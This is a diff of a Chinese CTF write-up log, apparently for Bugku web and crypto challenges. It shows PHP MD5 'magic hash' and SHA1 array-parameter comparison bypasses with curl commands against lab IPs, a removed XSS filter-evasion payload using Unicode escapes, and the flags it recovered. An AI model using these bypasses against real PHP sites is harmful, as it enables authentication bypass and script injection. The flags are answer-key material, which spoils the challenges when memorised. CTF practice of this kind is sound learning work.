@@ -1093,63 +1093,80 @@ Keep-Alive: timeout=60
 
 Flag: flag{bugk1u-ad8-3dsa-2}
 
-==================
-简单加密
-==================
-判断为凯撒加密(再加base64)
-用脚本 ctf005.py
-key{68743000650173230e4a58ee153c68e8}
+=======================
+md5加密相等绕过
+=======================
+http://120.24.86.145:9009/13.php
 
-=============
-聪明的小羊
-=============
-用python脚本 ctf006.py
-KEY{sad23jjdsa2}
+<?php
+$md51 = md5('QNKCDZO');
+$a = @$_GET['a'];
+$md52 = @md5($a);
+if(isset($a)){
+if ($a != 'QNKCDZO' && $md51 == $md52) {
+echo "flag{*}";
+} else {
+echo "false!!!";
+}}
+else{echo "please input a";}
+?>
 
-
-================
-托马斯.杰斐逊
-================
-转盘加密、转轮加密
-
-
-
-================
-一段Base64
-================
-用python脚本 ctf007.py
-
-===============
-奇怪的密码
-===============
-用 ctf008.py
+md5('240610708')   == md5('QNKCDZO');
+curl -i  http://120.24.86.145:9009/13.php?a=240610708
 
 
-=============
-XSS
-=============
+=========================
+sha()函数比较绕过
+=========================
+http://120.24.86.145:9009/7.php
 
-XSS注入测试
-1、请注入一段XSS代码，获取Flag值
+<?php
+$flag = "flag";
+if (isset($_GET['name']) and isset($_GET['password']))
+{
+var_dump($_GET['name']);
+echo "
+";
+var_dump($_GET['password']);
+var_dump(sha1($_GET['name']));
+var_dump(sha1($_GET['password']));
+if ($_GET['name'] == $_GET['password'])
+echo '
 
-2、必须包含alert(_key_)，_key_会自动被替换
+Your password can not be your name!
 
-输入http://103.238.227.13:10089/?id=<script>alert(111)</script>
+';
+else if (sha1($_GET['name']) === sha1($_GET['password']))
+die('Flag: '.$flag);
+else
+echo '
+Invalid password.
 
-被替换
-<script>
-	var s="&lt;script&gt;alert(111)&lt;/script&gt;";	document.getElementById('s').innerHTML = s;
-</script>
+';
+}
+else
+echo '
+Login first!
 
-用Unicode编码
-\u003cscript\u003ealert(111)\u003c/script\u003e
+';
+?>
 
-返回不同行数据<script>
-	var s="\u003cscript\u003ealert('Flag:17f094325e90085b30a5ddefce34acd8')\u003c/script\u003e";	document.getElementById('s').innerHTML = s;
-	</script>
+curl -i "http://120.24.86.145:9009/7.php?name\[\]=1&password\[\]=2"
+Flag: flag{bugku--daimasj-a2}
 
 
-===============
-  zip 伪加密
-===============
-用 winzip 打开，修改文件头位置0x47 09->00      
+
+====================================
+富强民主
+====================================
+核心价值观密码
+
+用ctf010.py 解码
+
+
+==============================
+贝斯家族
+==============================
+base91 编码
+用 ctf011.py 解码
+flag{554a5058c9021c76}
